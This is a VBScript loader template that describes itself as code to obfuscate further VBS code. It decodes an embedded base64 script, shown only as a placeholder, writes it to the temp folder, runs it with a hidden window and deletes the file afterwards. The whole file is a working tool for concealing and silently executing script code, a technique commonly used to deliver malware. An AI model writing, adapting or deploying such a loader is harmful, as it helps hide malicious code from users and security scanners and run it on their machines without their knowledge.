' THIS IS CODE TO LOOSELY OBFUSCATE FURTHER VBS CODE

Function Stream_BinaryToString(Binary)
    Dim BinaryStream
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.Type = 1 ' adTypeBinary
    BinaryStream.Open
    BinaryStream.Write Binary
    BinaryStream.Position = 0
    BinaryStream.Type = 2 ' adTypeText
    BinaryStream.Charset = "us-ascii"
    Stream_BinaryToString = BinaryStream.ReadText
    BinaryStream.Close
    Set BinaryStream = Nothing
End Function
Function Decoder(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Decoder = Stream_BinaryToString(oNode.nodeTypedValue)
    Set oNode = Nothing
    Set oXML = Nothing
End Function
Dim encodedScript

encodedScript = "BASE_64_ENCODED_VBS_SCRIPT_HERE"


Dim decodedScript
decodedScript = Decoder(encodedScript)
Dim tempFile
Dim fs
Set fs = CreateObject("Scripting.FileSystemObject")
tempFile = fs.GetSpecialFolder(2) & "\temp.vbs"
Dim f
Set f = fs.CreateTextFile(tempFile, True)
f.Write decodedScript
f.Close
Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run tempFile, 0, True
fs.DeleteFile tempFile, True
Set fs = Nothing